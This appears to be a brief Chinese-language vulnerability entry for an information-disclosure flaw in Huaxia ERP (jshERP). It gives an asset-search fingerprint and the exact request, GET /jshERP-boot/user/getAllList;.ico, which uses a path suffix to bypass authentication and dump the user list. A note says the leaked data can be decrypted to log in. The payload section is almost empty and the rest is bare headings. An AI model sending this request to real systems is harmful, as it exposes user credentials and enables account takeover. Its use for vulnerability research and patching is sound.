# 华夏ERPgetAllList存在信息泄露漏洞

- **系统**：华夏　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`web.body="jshERP"`
- **请求**：`GET /jshERP-boot/user/getAllList;.ico HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1704276087; Hm_lpvt_1cd9bcbaae133f03a6eb…`

**请求体 / payload**
```

解密即可登录\
```

**其他**
- 华夏ERP getAllList存在信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * jshERP